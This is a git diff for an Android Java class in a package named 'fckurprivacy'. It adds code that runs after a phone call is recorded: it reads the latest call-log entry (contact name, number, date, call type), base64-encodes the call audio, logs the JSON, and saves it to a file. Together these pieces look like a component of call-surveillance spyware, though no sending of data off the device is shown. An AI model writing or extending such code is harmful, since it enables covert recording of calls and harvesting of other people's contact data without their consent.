@@ -1,10 +1,17 @@
 package com.vergermiya.harevost.fckurprivacy.CallRecorder;
 
+import com.vergermiya.harevost.fckurprivacy.CallLogger.CallLogger;
+import com.vergermiya.harevost.fckurprivacy.CallLogger.CallLogsJson;
+import com.vergermiya.harevost.fckurprivacy.Util.FileSaver;
+import com.vergermiya.harevost.fckurprivacy.Util.JsonBuilder;
 import com.vergermiya.harevost.fckurprivacy.Util.PrefsHelper;
 
 import android.content.Context;
 import android.media.MediaRecorder;
+import android.provider.CallLog;
 import android.util.Log;
+
+import org.json.JSONStringer;
 
 import java.io.File;
 import java.io.IOException;
@@ -65,7 +72,19 @@ public class CallRecordReceiver extends PhoneCallReceiver {
     }
 
     protected void onRecordingFinished(Context context, CallRecord callRecord, File audioFile) {
-        file2Base64(audioFile);
+        CallLogsJson callLogsJson = CallLogger.getLatestCallLog(context);
+        String callName = callLogsJson.getCallName();
+        String phoneNumber = callLogsJson.getPhoneNumber();
+        String callDate = callLogsJson.getCallDate();
+        String callType = callLogsJson.getCallType();
+        String jsonFileName = callName + "_" + phoneNumber + "_" + callDate + "_" + callType;
+        String base64Audio = file2Base64(audioFile);
+
+        CallRecordJSon callRecordJSon = new CallRecordJSon(phoneNumber, callDate, callType, base64Audio);
+        JSONStringer jsonStringer = JsonBuilder.buildCallRecordJson(callRecordJSon);
+        Log.d("CallRecordJson", jsonStringer.toString());
+        FileSaver fileSaver = new FileSaver();
+        fileSaver.saveFile(jsonFileName, ".json", jsonStringer.toString());
     }
 
     private void startRecord(Context context, String seed, String phoneNumber) {
